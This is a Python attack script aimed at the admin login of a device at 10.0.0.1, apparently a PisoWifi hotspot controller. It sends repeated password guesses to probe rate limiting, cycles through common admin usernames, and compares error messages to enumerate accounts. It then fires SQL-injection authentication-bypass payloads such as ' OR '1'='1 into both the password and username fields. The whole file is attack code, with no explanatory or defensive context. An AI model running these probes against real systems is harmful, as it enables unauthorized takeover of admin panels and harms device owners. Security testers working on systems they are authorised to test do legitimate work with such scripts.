import requests
import re

TARGET = "http://10.0.0.1"
ADMIN_LOGIN = f"{TARGET}/admin/index?execute=1&exec=login"

# Test rate limiting
print("=== Rate Limit Check ===")
for i in range(15):
    resp = requests.post(ADMIN_LOGIN, data={"username": "admin", "password": f"test{i}"}, timeout=10)
    result = resp.text.strip()
    print(f"  Attempt {i+1}: '{result[:40]}'")
    if result.startswith("CAPTCHA") or "rate" in result.lower() or "limit" in result.lower():
        print(f"  *** RATE LIMITED at attempt {i+1}! ***")
        break

# Test username enumeration
print("\n=== Username Check ===")
usernames = ["admin", "administrator", "root", "user", "lpb", "pisowifi", "manager", "test", "guest", "owner"]
for user in usernames:
    resp = requests.post(ADMIN_LOGIN, data={"username": user, "password": "wrong"}, timeout=10)
    result = resp.text.strip()
    print(f"  '{user}': '{result[:50]}'")

# Check if error message differs for wrong username vs wrong password
print("\n=== Error Message Analysis ===")
msg1 = requests.post(ADMIN_LOGIN, data={"username": "nonexistent_user", "password": "test"}, timeout=10).text.strip()
msg2 = requests.post(ADMIN_LOGIN, data={"username": "admin", "password": "wrong"}, timeout=10).text.strip()
print(f"  Wrong user: '{msg1}'")
print(f"  Wrong pass: '{msg2}'")
print(f"  Same message? {msg1 == msg2}")

# Test for password field SQL injection
print("\n=== Password SQL Injection ===")
pass_injections = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "1' OR '1'='1' --",
    "anything' OR 'x'='x",
    "' OR '1'='1' #",
    "1' OR 1=1 #",
    "admin",
    "",
]
for pw in pass_injections:
    resp = requests.post(ADMIN_LOGIN, data={"username": "admin", "password": pw}, timeout=10)
    result = resp.text.strip()
    print(f"  pw='{pw[:20]}': '{result[:40]}'")

# Test for username SQL injection  
print("\n=== Username SQL Injection ===")
for user in ["admin", "admin' --", "admin'/*", "admin'#", "' OR 1=1 --", "1' OR 1=1"]:
    resp = requests.post(ADMIN_LOGIN, data={"username": user, "password": ""}, timeout=10)
    result = resp.text.strip()
    print(f"  user='{user}': '{result[:40]}'")
